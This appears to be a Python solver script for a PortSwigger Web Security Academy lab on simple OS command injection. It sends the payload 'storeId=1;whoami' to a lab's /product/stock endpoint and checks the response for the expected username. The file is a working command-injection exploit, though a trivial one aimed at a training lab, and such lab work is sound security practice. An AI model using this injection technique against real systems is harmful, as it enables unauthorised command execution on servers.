import requests
import argparse

# https://portswigger.net/web-security/os-command-injection/lab-simple

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="Specify a target. E.g. -t https://abcdefghijk1234567.web-security-academy.net")
args = parser.parse_args()

if not args.target:
    print("[!] You need to specify a target.")
    print("[*] Example usage: command-injection-01.py -t https://abcdefghijk1234567.web-security-academy.net")
    exit(0)

# test connection to the target
r = requests.get(args.target)
if r.status_code == 200:
    print('[*] Target is up')
else:
    print('[!] Target seems down')
    exit(0)

# create the target payload
payload = args.target + "/product/stock"
payload_data = 'productId=1&storeId=1;whoami'
print('[*] Target created: ' + payload)
print('[*] Payload created: ' + payload_data)

r = requests.post(payload, data=payload_data)
if r.status_code == 200:
    print('[*] Payload sent')
    # check the contents of the file
    completion_text = 'peter'
    if completion_text in r.text:
        print('[*] Success')
    else:
        print('[!] Exploit failed')
        exit(0)
else:
    print('[!] Exploit failed')
    exit(0)
